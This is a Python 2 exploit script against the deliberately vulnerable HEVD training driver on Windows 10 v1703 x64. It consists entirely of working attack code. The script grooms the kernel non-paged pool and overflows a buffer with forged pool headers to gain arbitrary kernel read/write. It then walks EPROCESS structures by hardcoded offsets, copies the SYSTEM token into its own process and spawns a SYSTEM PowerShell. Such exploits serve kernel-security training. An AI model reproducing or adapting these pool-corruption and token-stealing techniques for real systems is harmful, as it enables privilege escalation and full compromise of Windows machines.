#!/usr/bin/python
#
# HEVD v3.00 BufferOverflowNonPagedPoolNx exploit for Windows 10 v1703 x64 by @acru3l.
#

import sys
import struct
import os
from ctypes import *
from ctypes.wintypes import *

ioctl_BufferOverflowNonPagedPoolNx = 0x22204B
ioctl_CreateArbitraryReadWriteHelperObjectNonPagedPoolNx = 0x222063
ioctl_SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx = 0x222067
ioctl_GetArbitraryReadWriteHelperObjecNameNonPagedPoolNx = 0x22206B
ioctl_DeleteArbitraryReadWriteHelperObjectNonPagedPoolNx = 0x22206F

device_name = r'\\.\HackSysExtremeVulnerableDriver'
hFile = None

class ARW_HELPER_OBJECT_NON_PAGED_POOL_NX(Structure):
    _fields_ = [('Name', c_void_p),
                ('Length', c_ulonglong)]

class ARW_HELPER_OBJECT_IO(Structure):
    _fields_ = [('HelperObjectAddress', c_void_p),
                ('Name', c_void_p),
                ('Length', c_ulonglong)]

def open_device():
    '''
    (re)open vulnerable device
    '''
    global hFile
    
    if hFile > 0:
        windll.kernel32.CloseHandle(hFile)
    
    hFile = windll.kernel32.CreateFileA(
        device_name,
        0xC0000000,                                     # GENERIC_READ | GENERIC_WRITE
        0x00000001,                                     # FILE_SHARE_READ
        0,                                              # NULL
        3,                                              # OPEN_EXISTING
        0x80,                                           # FILE_ATTRIBUTE_NORMAL
        0)                                              # NULL
    
    if hFile == -1:
        #print '[-] Failed to open device: %s' % device_name
        return False
    else:
        #print '[+] Device opened successfully: %s' % device_name
        return True

def call_BufferOverflowNonPagedPoolNx(data):
    '''
    DeviceIoControl wrapper
    '''
    open_device()
    data_buff = create_string_buffer(data)
    bytes_retn = c_ulong(0)
    
    print '[+] Triggering buffer overflow in NonPagedPoolNx'
    
    windll.kernel32.DeviceIoControl(
        hFile,
        ioctl_BufferOverflowNonPagedPoolNx,
        data_buff,
        len(data),
        0,
        0,
        byref(bytes_retn),
        0)

def call_CreateArbitraryReadWriteHelperObjectNonPagedPoolNx(size):
    '''
    DeviceIoControl wrapper
    '''
    open_device()
    helper_io = ARW_HELPER_OBJECT_IO()
    helper_io.HelperObjectAddress = c_void_p(0)
    helper_io.Name = c_void_p(0)
    helper_io.Length = c_ulonglong(size)
    bytes_retn = c_ulong(0)
    
    windll.kernel32.DeviceIoControl(
        hFile,
        ioctl_CreateArbitraryReadWriteHelperObjectNonPagedPoolNx,
        addressof(helper_io),
        sizeof(helper_io),
        0,
        0,
        byref(bytes_retn),
        0)
    return helper_io.HelperObjectAddress

def call_SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx(obj, name):
    '''
    DeviceIoControl wrapper
    '''
    open_device()
    
    helper_io = ARW_HELPER_OBJECT_IO()
    helper_io.HelperObjectAddress = c_void_p(obj)
    name_buff = create_string_buffer(name)
    helper_io.Name = c_void_p(addressof(name_buff))
    helper_io.Length = c_ulonglong(len(name))
    bytes_retn = c_ulong(0)
    
    windll.kernel32.DeviceIoControl(
        hFile,
        ioctl_SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx,
        addressof(helper_io),
        sizeof(helper_io),
        0,
        0,
        byref(bytes_retn),
        0)

def call_GetArbitraryReadWriteHelperObjecNameNonPagedPoolNx(obj):
    '''
    DeviceIoControl wrapper
    '''
    open_device()
    helper_io = ARW_HELPER_OBJECT_IO()
    helper_io.HelperObjectAddress = c_void_p(obj)
    name_buff = create_string_buffer(0x8)
    helper_io.Name = c_void_p(addressof(name_buff))
    helper_io.Length = c_ulonglong(0)
    bytes_retn = c_ulong(0)
    
    windll.kernel32.DeviceIoControl(
        hFile,
        ioctl_GetArbitraryReadWriteHelperObjecNameNonPagedPoolNx,
        addressof(helper_io),
        sizeof(helper_io),
        0,
        0,
        byref(bytes_retn),
        0)
    return name_buff.raw

def call_DeleteArbitraryReadWriteHelperObjecNonPagedPoolNx(obj):
    '''
    DeviceIoControl wrapper
    '''
    open_device()
    helper_io = ARW_HELPER_OBJECT_IO()
    helper_io.HelperObjectAddress = c_void_p(obj)
    helper_io.Name = c_void_p(0)
    helper_io.Length = c_ulonglong(0)
    bytes_retn = c_ulong(0)
    
    windll.kernel32.DeviceIoControl(
        hFile,
        ioctl_DeleteArbitraryReadWriteHelperObjectNonPagedPoolNx,
        addressof(helper_io),
        sizeof(helper_io),
        0,
        0,
        byref(bytes_retn),
        0)

def create_event_object():
    '''
    CreateEventA wrapper
    '''
    return windll.kernel32.CreateEventA(
        0,
        0,
        0,
        '')

def read_qword(addr):
    '''
    read arbitrary qword using corrupted helper obj
    '''
    name = struct.pack('<Q', addr)
    call_SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx(corrupted, name)
    res = call_GetArbitraryReadWriteHelperObjecNameNonPagedPoolNx(rw_helper)
    return struct.unpack('<Q', res)[0]

def write_qword(addr, value):
    '''
    write arbitrary qword using corrupted helper obj
    '''
    name = struct.pack('<Q', addr)
    data = struct.pack('<Q', value)
    call_SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx(corrupted, name)
    call_SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx(rw_helper, data)

def test_arw():
    '''
    check if arbitrary read/write works as we expect
    '''
    import random
    rand_int = random.randint(0, 2 ** 0x40)
    rand_data = struct.pack('<Q', rand_int)
    rand_buff = create_string_buffer(rand_data)
    read_value = read_qword(addressof(rand_buff))
    if read_value != rand_int:
        print '[-] Test read failed: %016x != %016x' % (read_value, rand_int)
        return False
    print '[+] Test read success'
    
    rand_int = random.randint(0, 2 ** 0x40)
    rand_data = struct.pack('<Q', rand_int)
    write_buff = create_string_buffer(8)
    write_qword(addressof(write_buff), rand_int)
    if write_buff.raw != rand_data:
        print '[-] Test write failed: %016x != %016x' % (struct.unpack('<Q', write_buff.raw)[0], rand_int)
        return False
    print '[+] Test write success'
    
    return True

def get_kernel_base():
    '''
    find base address of the kernel via EnumDeviceDrivers
    '''
    array = c_ulonglong * 0x400
    addr = array()
    
    windll.psapi.EnumDeviceDrivers.argtypes = [POINTER(LPVOID), DWORD, POINTER(DWORD)]
    windll.psapi.EnumDeviceDrivers.restype = BOOL
    
    res = windll.psapi.EnumDeviceDrivers(
            cast(byref(addr), POINTER(LPVOID)),
            sizeof(addr),
            byref(c_ulong(0)))
    if not res:
        return None
    
    # Kernel is the first entry of the result
    return addr[0]

def get_device_name(addr):
    '''
    find file name of kernel via GetDeviceDriverBaseNameA
    '''
    buff = create_string_buffer(0x400)
    
    windll.psapi.GetDeviceDriverBaseNameA.argtypes = [LPVOID, LPCSTR, DWORD]
    windll.psapi.GetDeviceDriverBaseNameA.restype = DWORD
    
    res = windll.psapi.GetDeviceDriverBaseNameA(
            addr,
            buff,
            sizeof(buff))
    if res == 0:
        return None
    
    return buff[:res]

def get_PsInitialSystemProcess():
    '''
    find PsInitialSystemProcess from kernel address space
    '''
    base_addr = get_kernel_base()
    if not base_addr:
        print '[-] Failed to obtain Kernel base'
        return None
    print '[+] Kernel base address: 0x%016x' % base_addr
    
    kernel_name = get_device_name(base_addr)
    if not kernel_name:
        print '[+] Failed to obtain Kernel name'
        return None
    print '[+] Kernel name: %s' % kernel_name
    
    windll.kernel32.LoadLibraryA.argtypes = [LPCSTR]
    windll.kernel32.LoadLibraryA.restype = LPVOID
    
    hModule = windll.kernel32.LoadLibraryA(kernel_name)
    if hModule == 0:
        print '[-] Failed to load Kernel image: %s' % kernel_name
        return None
    print '[+] Kernel image loaded: 0x%016x' % hModule
    
    windll.kernel32.GetProcAddress.argtypes = [HMODULE, LPCSTR]
    windll.kernel32.GetProcAddress.restype = LPVOID 
    
    sys_init = windll.kernel32.GetProcAddress(hModule, 'PsInitialSystemProcess')
    if sys_init == 0:
        print '[-] Failed to find PsInitialSystemProcess'
        return None
        
    sys_init_kernel = base_addr - hModule + sys_init
    
    return sys_init_kernel

def steal_token(sys_eproc):
    sys_pid = read_qword(sys_eproc + 0x2E0)                 # 0x2E0 = offset nt!_EPROCESS.UniqueProcessId
    sys_token = read_qword(sys_eproc + 0x358)               # 0x358 = offset nt!_EPROCESS.Token

    print '[+] System\'s EPROCESS: 0x%016x' % sys_eproc
    print '[+] pid = %x, token = 0x%016x' % (sys_pid, sys_token)

    # find my own EPROCESS
    print '[+] Walking through ActiveProcessLinks list'

    my_pid = os.getpid()
    eproc = sys_eproc
    while True:
        eproc = read_qword(eproc + 0x2E8) - 0x2E8           # 0x2E8 = offset nt!_EPROCESS.ActiveProcessLinks.Flink
        pid = read_qword(eproc + 0x2E0)                     # 0x2E0 = offset nt!_EPROCESS.UniqueProcessId
        if pid == my_pid:
            print '[+] Found my EPROCESS: 0x%016x' % eproc
            my_eproc = eproc
            break
        if pid == sys_pid:
            print '[-] Couldn\'t find my EPROCESS'
            return
    
    # setting stolen token
    print '[+] Installing SYSTEM token'

    write_qword(my_eproc + 0x358, sys_token)                # 0x358 = offset nt!_EPROCESS.Token

def break_code():
    import time
    time.sleep(0.5)
    windll.kernel32.DebugBreak()

if __name__ == '__main__':
    if not open_device():
        sys.exit(1)
    
    # start pool grooming
    for i in xrange(0x10000):
        create_event_object()
    
    # placing helper objs
    # -----+-----+--------+-----+-----+-----+-----+--------+-----+-----
    #  ... | evt | helper | evt | evt | evt | evt | helper | evt | ...
    # -----+-----+--------+-----+-----+-----+-----+--------+-----+-----
    helper_objs = []
    evt_handles = []
    for i in xrange(0x5000):
        if i % 5 == 0:
            obj = call_CreateArbitraryReadWriteHelperObjectNonPagedPoolNx(0x8)
            if obj:
                helper_objs.append(obj)
                name = 'A' * 0x8
                call_SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx(obj, name)
            else:
                print '[!] Failed to create helper object'
        else:
            evt_handles.append(create_event_object())
    
    # creating holes
    # -----+-----+--------+-----+-----+-----+-----+--------+-----+-----
    #  ... |  F  | helper |  F  |  F  |  F  |  F  | helper |  F  | ...
    # -----+-----+--------+-----+-----+-----+-----+--------+-----+-----
    for h in evt_handles:
        windll.kernel32.CloseHandle(h)
    
    # helper obj to do arw
    rw_helper = call_CreateArbitraryReadWriteHelperObjectNonPagedPoolNx(0x10)
    
    print '[+] rw_helper = 0x%016x' % rw_helper
    
    # kd> dt nt!_POOL_HEADER ffffd201bb8db480 
    #    +0x000 PreviousSize     : 0y00100000 (0x20)
    #    +0x000 PoolIndex        : 0y00000000 (0)
    #    +0x002 BlockSize        : 0y00000010 (0x2)
    #    +0x002 PoolType         : 0y00000010 (0x2)
    #    +0x000 Ulong1           : 0x2020020
    #    +0x004 PoolTag          : 0x6b636148
    #    +0x008 ProcessBilled    : (null) 
    #    +0x008 AllocatorBackTraceIndex : 0
    #    +0x00a PoolTagHash      : 0
    fake_header0 = struct.pack('<Q', 0x6b63614802020020) + \
                   struct.pack('<Q', 0xa7e8f97e26e752d7)
    fake_buffer  = struct.pack('<Q', 0x4141414141414141) + \
                   struct.pack('<Q', 0x0000000000000000)

    # kd> dt nt!_POOL_HEADER ffffd201bb8db4a0 
    #    +0x000 PreviousSize     : 0y00000010 (0x2)
    #    +0x000 PoolIndex        : 0y00000000 (0)
    #    +0x002 BlockSize        : 0y00000010 (0x2)
    #    +0x002 PoolType         : 0y00000010 (0x2)
    #    +0x000 Ulong1           : 0x2020002
    #    +0x004 PoolTag          : 0x6b636148
    #    +0x008 ProcessBilled    : (null) 
    #    +0x008 AllocatorBackTraceIndex : 0
    #    +0x00a PoolTagHash      : 0
    fake_header1 = struct.pack('<Q', 0x6b63614802020002) + \
                   struct.pack('<Q', 0xa7e8f97e26e752d7)
    fake_helper  = struct.pack('<Q', rw_helper) + \
                   struct.pack('<Q', 0x0000000000000008)
    
    payload = 'B' * 0x1F0 + \
              fake_header0 + \
              fake_buffer + \
              fake_header1 + \
              fake_helper
    
    # plug a hole and overflow
    # -----+-----+--------+-----+-----+-----+-----+--------+-----+-----
    #  ... |  F  | helper |       overflow   -->  | helper |  F  | ...
    # -----+-----+--------+-----+-----+-----+-----+--------+-----+-----
    call_BufferOverflowNonPagedPoolNx(payload)
    
    # search for corrupted obj
    corrupted = None
    for p in helper_objs:
        name = call_GetArbitraryReadWriteHelperObjecNameNonPagedPoolNx(p)
        if name[:0x8] != 'A' * 0x8 and name[:0x8] != struct.pack('<Q', rw_helper):
            corrupted = p
            print '[+] Found an corrupted object: 0x%016x' % p
            #print name[:0x8].encode('hex')
    if not corrupted:
        print '[-] Failed to corrupt helper object'
        sys.exit(1)
    
    # test arw before proceeding
    if not test_arw():
        sys.exit(1)
    
    # find PsInitialSystemProcess
    sys_init = get_PsInitialSystemProcess()
    
    # address of SYSTEM EPROCESS
    if sys_init:
        sys_eproc = read_qword(sys_init)
    
    # steal SYSTEM token
    if sys_eproc:
        steal_token(sys_eproc)
    
    # Got SYSTEM shell?
    os.system("powershell.exe")
    
    # clean up helper objs
    for p in helper_objs:
        if p != corrupted:
            call_DeleteArbitraryReadWriteHelperObjecNonPagedPoolNx(p)
